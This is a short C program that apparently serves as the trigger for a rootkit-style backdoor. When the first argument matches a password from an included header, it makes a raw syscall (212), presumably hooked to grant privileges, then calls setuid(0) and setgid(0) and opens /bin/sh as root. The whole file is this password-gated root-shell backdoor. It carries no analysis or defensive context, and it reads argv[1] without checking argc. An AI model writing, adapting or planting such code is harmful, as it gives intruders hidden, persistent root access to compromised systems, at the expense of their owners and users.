#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "bds_vars.h"

int main(int argc, char **argv) {
	if (strcmp(argv[1], password) == 0) {
		syscall(212);
		setuid(0);
		setgid(0);	
		system("/bin/sh");
	}	
	
	return 0;
}
